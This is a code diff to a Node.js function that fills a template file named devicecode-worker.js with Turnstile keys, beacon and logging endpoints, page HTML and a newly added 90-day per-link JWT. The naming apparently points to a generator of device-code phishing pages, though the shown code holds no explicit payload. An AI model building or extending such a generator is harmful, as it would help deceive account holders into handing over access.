@@ -230,20 +230,25 @@ async function generateExportHtml(link, user, options = {}) {
 }
 
 async function buildWorkerScript(link, user, apiBaseUrl) {
-  const pageHtml = await renderPageHtml(link, user, {});
+   const pageHtml = await renderPageHtml(link, user, {});
 
-  let workerJs = fs.readFileSync(path.join(__dirname, '..', '..', 'worker', 'devicecode-worker.js'), 'utf8');
+   let workerJs = fs.readFileSync(path.join(__dirname, '..', '..', 'worker', 'devicecode-worker.js'), 'utf8');
 
-  const verifyUrl = apiBaseUrl || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? `https://${config.CF_WORKERS_SUBDOMAIN}.workers.dev` : `http://localhost:${config.PORT}`);
-  workerJs = workerJs
-    .replace("'{{TURNSTILE_KEY}}'", `'${config.CF_TURNSTILE_SITE_KEY}'`)
-    .replace("'{{TURNSTILE_SECRET}}'", `'${config.CF_TURNSTILE_SECRET_KEY}'`)
-    .replace("'{{VERIFY_ENDPOINT}}'", `'${verifyUrl}'`)
-    .replace("'{{BEACON_ENDPOINT}}'", `'${verifyUrl}'`)
-    .replace("'{{LOG_ENDPOINT}}'", `'${verifyUrl}'`)
-    .replace("'{{TEMPLATE_HTML}}'", '`' + pageHtml.replace(/`/g, '\\`').replace(/\$/g, '\\$') + '`');
+   const verifyUrl = apiBaseUrl || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? `https://${config.CF_WORKERS_SUBDOMAIN}.workers.dev` : `http://localhost:${config.PORT}`);
+   
+   // Generate JWT for this link
+   const linkJwt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
+   
+   workerJs = workerJs
+     .replace("'{{JWT_TOKEN}}'", `'${linkJwt}'`)
+     .replace("'{{TURNSTILE_KEY}}'", `'${config.CF_TURNSTILE_SITE_KEY}'`)
+     .replace("'{{TURNSTILE_SECRET}}'", `'${config.CF_TURNSTILE_SECRET_KEY}'`)
+     .replace("'{{VERIFY_ENDPOINT}}'", `'${verifyUrl}'`)
+     .replace("'{{BEACON_ENDPOINT}}'", `'${verifyUrl}'`)
+     .replace("'{{LOG_ENDPOINT}}'", `'${verifyUrl}'`)
+     .replace("'{{TEMPLATE_HTML}}'", '`' + pageHtml.replace(/`/g, '\\`').replace(/\$/g, '\\$') + '`');
 
-  return workerJs;
+   return workerJs;
 }
 
 module.exports = {
